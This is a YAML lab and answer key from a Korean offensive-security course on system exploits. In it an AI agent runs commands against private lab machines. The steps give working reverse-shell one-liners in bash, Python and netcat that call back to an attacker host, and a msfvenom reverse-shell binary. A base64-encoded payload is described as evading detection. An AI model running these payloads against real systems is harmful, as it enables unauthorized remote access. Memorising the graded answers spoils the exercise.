lab_id: attack-ai-week07
title: 시스템 익스플로잇 (System Exploits) (AI 지원)
version: ai
course: attack-ai
week: 7
description: 버퍼 오버플로, 서비스 취약점 공격, Metasploit 활용 등 시스템 레벨의 익스플로잇 기법을 실습한다. 취약한 서비스를 식별하고 공격 코드를 실행하여 초기 접근을 확보한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: medium
duration_minutes: 120
objectives:
- Metasploit 프레임워크의 기본 사용법을 익힌다
- 취약한 서비스에 대한 익스플로잇을 선택하고 실행할 수 있다
- 셸을 획득한 후 기본적인 post-exploitation을 수행한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: searchsploit을 사용하여 대상 서버에서 발견된 서비스들(Apache, Node.js, SSH)에 대한 익스플로잇을 검색하라.
  hint: searchsploit 서비스명 버전 형태로 검색한다
  category: recon
  points: 10
  answer: searchsploit apache 2.4 && echo '---' && searchsploit openssh
  answer_detail: searchsploit은 Exploit-DB의 로컬 검색 도구로, 서비스명과 버전으로 공개된 익스플로잇을 검색한다. -m 옵션으로 익스플로잇 코드를 현재 디렉토리에 복사할 수 있다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: searchsploit apache 2.4 && echo '---' && searchsploit openssh
  risk_level: low
  bastion_prompt: searchsploit을 사용하여 대상 서버에서 발견된 서비스들(Apache, Node.js, SSH)에 대한 익스플로잇을 검색해줘
- order: 2
  instruction: msfconsole에서 사용 가능한 exploit 모듈 중 http 관련 모듈을 검색하라.
  hint: msfconsole -q -x 'search type:exploit http; exit' 형태로 실행한다
  category: recon
  points: 10
  answer: msfconsole -q -x 'search type:exploit name:nodejs; exit' 2>/dev/null | head -30
  answer_detail: Metasploit은 세계 최대의 침투 테스트 프레임워크로, 수천 개의 익스플로잇 모듈을 포함한다. search 명령으로 대상 서비스에 적합한 모듈을 찾고, 자동화된 공격을 수행할 수 있다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: msfconsole -q -x 'search type:exploit name:nodejs; exit' 2>/dev/null | head -30
  risk_level: low
  bastion_prompt: msfconsole에서 사용 가능한 exploit 모듈 중 http 관련 모듈을 검색해줘
- order: 3
  instruction: JuiceShop(Node.js)에 대해 Metasploit의 auxiliary 스캐너를 사용하여 HTTP 정보를 수집하라.
  hint: auxiliary/scanner/http/http_version 모듈을 사용한다
  category: recon
  points: 10
  answer: msfconsole -q -x 'use auxiliary/scanner/http/http_version; set RHOSTS 10.20.30.80; set RPORT 3000; run; exit' 2>/dev/null
  answer_detail: Metasploit의 auxiliary 모듈은 정보 수집, 스캐닝, 서비스 열거에 사용된다. exploit과 달리 공격을 수행하지 않으며, 대상 시스템의 정보를 안전하게 수집한다.
  verify:
    type: output_contains
    expect: ''
    field: stdout
  target_vm: attacker
  script: msfconsole -q -x 'use auxiliary/scanner/http/http_version; set RHOSTS 10.20.30.80; set RPORT 3000; run; exit' 2>/dev/null
  risk_level: low
  bastion_prompt: JuiceShop(Node.js)에 대해 Metasploit의 auxiliary 스캐너를 사용하여 HTTP 정보를 수집해줘
- order: 4
  instruction: netcat으로 간단한 리버스 셸 리스너를 설정하라. 포트 4444에서 연결을 대기하라(5초 후 자동 종료).
  hint: nc -lvnp 포트 형태로 리스너를 설정한다
  category: exploit
  points: 10
  answer: timeout 5 nc -lvnp 4444 2>&1 & echo 'Listener started on port 4444' && sleep 1 && echo 'test connection' | nc -w 1 localhost 4444 2>/dev/null; wait
  answer_detail: 리버스 셸 리스너는 공격자 측에서 연결을 대기하는 서버이다. 대상 시스템에서 역방향으로 연결을 맺으면(reverse shell), 방화벽의 outbound 규칙을 우회하여 셸 접근이 가능하다.
  verify:
    type: output_contains
    expect: ''
    field: stdout
  target_vm: attacker
  script: timeout 5 nc -lvnp 4444 2>&1 & echo 'Listener started on port 4444' && sleep 1 && echo 'test connection' | nc -w 1 localhost 4444 2>/dev/null; wait
  risk_level: medium
  bastion_prompt: netcat으로 간단한 리버스 셸 리스너를 설정해줘
- order: 5
  instruction: bash 리버스 셸 페이로드를 생성하라. python3으로 10.20.30.201:4444로 연결하는 리버스 셸 명령을 출력하라(실행하지 않고 출력만).
  hint: bash -i >& /dev/tcp/IP/PORT 0>&1 형태이다
  category: exploit
  points: 10
  answer: 'echo ''=== Reverse Shell Payloads ==='' && echo ''Bash: bash -i >& /dev/tcp/10.20.30.201/4444 0>&1'' && echo ''Python: python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\"10.20.30.201\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"''
    && echo ''Netcat: nc -e /bin/bash 10.20.30.201 4444'''
  answer_detail: 리버스 셸 페이로드는 다양한 언어(Bash, Python, Perl, PHP, Netcat)로 생성할 수 있다. 대상 시스템에서 사용 가능한 도구에 따라 적절한 페이로드를 선택한다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: 'echo ''=== Reverse Shell Payloads ==='' && echo ''Bash: bash -i >& /dev/tcp/10.20.30.201/4444 0>&1'' && echo ''Python: python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\"10.20.30.201\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"''
    && echo ''Netcat: nc -e /bin/bash 10.20.30.201 4444'''
  risk_level: medium
  bastion_prompt: bash 리버스 셸 페이로드를 생성하라. python3으로 10.20.30.201:4444로 연결하는 리버스 셸 명령을 출력하라(실행하지 않고 출력만)해줘
- order: 6
  instruction: msfvenom을 사용하여 Linux x64 리버스 셸 ELF 바이너리를 생성하라. LHOST=10.20.30.201, LPORT=4444로 설정하라.
  hint: msfvenom -p linux/x64/shell_reverse_tcp 옵션을 사용한다
  category: exploit
  points: 10
  answer: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f elf -o /tmp/reverse_shell.elf 2>/dev/null && file /tmp/reverse_shell.elf && ls -la /tmp/reverse_shell.elf
  answer_detail: msfvenom은 Metasploit의 페이로드 생성 도구이다. 다양한 OS/아키텍처(Windows, Linux, macOS)와 출력 형식(ELF, EXE, Python, PHP 등)을 지원한다. 실전에서는 AV 회피를 위해 인코딩을 적용한다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f elf -o /tmp/reverse_shell.elf 2>/dev/null && file /tmp/reverse_shell.elf && ls -la /tmp/reverse_shell.elf
  risk_level: medium
  bastion_prompt: msfvenom을 사용하여 Linux x64 리버스 셸 ELF 바이너리를 생성하라. LHOST=10.20.30.201, LPORT=4444로 설정해줘
- order: 7
  instruction: web 서버(10.20.30.80)에 SSH로 접속하여 커널 버전과 배포판 정보를 확인하라. 이는 커널 익스플로잇 선택에 필요한 정보이다.
  hint: uname -a와 cat /etc/os-release 명령을 실행한다
  category: recon
  points: 10
  answer: ssh ccc@10.20.30.80 'uname -a && echo --- && cat /etc/os-release' 2>/dev/null
  answer_detail: 커널 버전과 배포판 정보는 로컬 권한 상승 익스플로잇(DirtyPipe, DirtyCow 등)의 적용 가능 여부를 판단하는 핵심 정보이다. 정확한 커널 버전이 익스플로잇 선택의 기준이 된다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: ssh ccc@10.20.30.80 'uname -a && echo --- && cat /etc/os-release' 2>/dev/null
  risk_level: low
  bastion_prompt: web 서버(10.20.30.80)에 SSH로 접속하여 커널 버전과 배포판 정보를 확인해줘
- order: 8
  instruction: web 서버에서 실행 중인 서비스 목록을 확인하라. 잠재적으로 취약한 서비스를 식별하라.
  hint: systemctl list-units --type=service로 서비스를 확인한다
  category: recon
  points: 10
  answer: ssh ccc@10.20.30.80 'systemctl list-units --type=service --state=running' 2>/dev/null | head -30
  answer_detail: 실행 중인 서비스 목록은 공격 표면을 파악하는 데 필수적이다. 불필요한 서비스가 실행 중이면 공격 벡터가 증가한다. 각 서비스의 버전을 확인하여 알려진 취약점을 검색한다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: ssh ccc@10.20.30.80 'systemctl list-units --type=service --state=running' 2>/dev/null | head -30
  risk_level: low
  bastion_prompt: web 서버에서 실행 중인 서비스 목록을 확인해줘
- order: 9
  instruction: curl로 JuiceShop의 /api/Quantitys 엔드포인트에 접근하여 에러 메시지에서 스택 트레이스가 노출되는지 확인하라.
  hint: 존재하지 않는 API에 접근하면 프레임워크 에러가 노출될 수 있다
  category: exploit
  points: 10
  answer: curl -s http://10.20.30.80:3000/api/Quantitys 2>/dev/null | python3 -m json.tool 2>/dev/null || curl -s http://10.20.30.80:3000/api/Quantitys
  answer_detail: 에러 메시지에 스택 트레이스, 파일 경로, 데이터베이스 정보 등이 포함되면 Information Disclosure 취약점이다. 공격자는 이 정보로 내부 구조를 파악하고 정밀한 공격을 계획할 수 있다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: curl -s http://10.20.30.80:3000/api/Quantitys 2>/dev/null | python3 -m json.tool 2>/dev/null || curl -s http://10.20.30.80:3000/api/Quantitys
  risk_level: medium
  bastion_prompt: curl로 JuiceShop의 /api/Quantitys 엔드포인트에 접근하여 에러 메시지에서 스택 트레이스가 노출되는지 확인해줘
- order: 10
  instruction: python3으로 간단한 포트 스캐너를 작성하고 10.20.30.80의 1-1024 포트를 스캔하라.
  hint: socket.connect_ex()를 사용하여 포트 상태를 확인한다
  category: exploit
  points: 10
  answer: 'python3 -c "import socket; [print(f''Port {p}: OPEN'') for p in range(1,1025) if socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex((''10.20.30.80'', p)) == 0]" 2>/dev/null'
  answer_detail: 커스텀 스캐너 작성은 도구에 의존하지 않고 원리를 이해하는 데 도움이 된다. connect_ex()는 연결 성공 시 0을 반환하며, 이를 이용하여 열린 포트를 식별한다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: 'python3 -c "import socket; [print(f''Port {p}: OPEN'') for p in range(1,1025) if socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex((''10.20.30.80'', p)) == 0]" 2>/dev/null'
  risk_level: medium
  bastion_prompt: python3으로 간단한 포트 스캐너를 작성하고 10 구현 방법과 예시를 설명해줘
- order: 11
  instruction: Metasploit의 http_login auxiliary 모듈을 사용하여 JuiceShop의 기본 인증을 테스트하라.
  hint: auxiliary/scanner/http/http_login 모듈을 사용한다
  category: exploit
  points: 10
  answer: msfconsole -q -x 'use auxiliary/scanner/http/http_login; set RHOSTS 10.20.30.80; set RPORT 3000; set AUTH_URI /rest/user/login; info; exit' 2>/dev/null | head -30
  answer_detail: Metasploit의 http_login 모듈은 웹 인증에 대한 자동화된 브루트포스를 수행한다. 사전 파일과 사용자 목록을 지정하여 대량의 자격 증명을 테스트할 수 있다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: msfconsole -q -x 'use auxiliary/scanner/http/http_login; set RHOSTS 10.20.30.80; set RPORT 3000; set AUTH_URI /rest/user/login; info; exit' 2>/dev/null | head -30
  risk_level: medium
  bastion_prompt: Metasploit의 http_login auxiliary 모듈을 사용하여 JuiceShop의 기본 인증을 테스트해줘
- order: 12
  instruction: web 서버에서 crontab 설정을 확인하여 자동 실행되는 작업이 있는지 검사하라. 잘못 설정된 cronjob은 권한 상승에 활용될 수 있다.
  hint: SSH로 접속하여 crontab -l과 /etc/crontab을 확인한다
  category: recon
  points: 10
  answer: ssh ccc@10.20.30.80 'crontab -l 2>/dev/null; echo ---; cat /etc/crontab 2>/dev/null; echo ---; ls -la /etc/cron.d/ 2>/dev/null' 2>/dev/null
  answer_detail: cronjob이 world-writable 스크립트를 root 권한으로 실행하면 권한 상승에 악용할 수 있다. 공격자가 해당 스크립트에 악성 코드를 삽입하면 다음 실행 시 root로 실행된다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: ssh ccc@10.20.30.80 'crontab -l 2>/dev/null; echo ---; cat /etc/crontab 2>/dev/null; echo ---; ls -la /etc/cron.d/ 2>/dev/null' 2>/dev/null
  risk_level: low
  bastion_prompt: web 서버에서 crontab 설정을 확인하여 자동 실행되는 작업이 있는지 검사해줘
- order: 13
  instruction: web 서버의 SUID 바이너리를 검색하라. 비정상적인 SUID 바이너리는 권한 상승에 활용할 수 있다.
  hint: find / -perm -4000 명령으로 SUID 파일을 검색한다
  category: recon
  points: 10
  answer: ssh ccc@10.20.30.80 'find / -perm -4000 -type f 2>/dev/null' 2>/dev/null
  answer_detail: SUID(Set User ID) 비트가 설정된 바이너리는 실행 시 소유자(보통 root)의 권한으로 실행된다. GTFOBins 사이트에서 각 바이너리의 권한 상승 방법을 확인할 수 있다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: ssh ccc@10.20.30.80 'find / -perm -4000 -type f 2>/dev/null' 2>/dev/null
  risk_level: low
  bastion_prompt: web 서버의 SUID 바이너리를 검색해줘
- order: 14
  instruction: msfvenom으로 Python 리버스 셸 페이로드를 생성하라. base64로 인코딩하여 탐지를 회피하라.
  hint: msfvenom -f python 출력을 base64 인코딩한다
  category: exploit
  points: 15
  answer: msfvenom -p python/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f raw 2>/dev/null | base64 | head -5 && echo '...(truncated)'
  answer_detail: 페이로드 인코딩은 시그니처 기반 탐지를 우회하는 기본 기법이다. Base64 인코딩된 페이로드는 exec(base64.b64decode(...))로 실행할 수 있다. 실전에서는 다중 인코딩과 커스텀 암호화를 사용한다.
  verify:
    type: output_contains
    expect: 
    field: stdout
  target_vm: attacker
  script: msfvenom -p python/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f raw 2>/dev/null | base64 | head -5 && echo '...(truncated)'
  risk_level: medium
  bastion_prompt: msfvenom으로 Python 리버스 셸 페이로드를 생성하라. base64로 인코딩하여 탐지를 회피해줘
- order: 15
  instruction: 시스템 익스플로잇 실습 결과를 /tmp/exploit_report.txt에 정리하라. 공격 경로, 획득한 정보, 보안 권고를 포함하라.
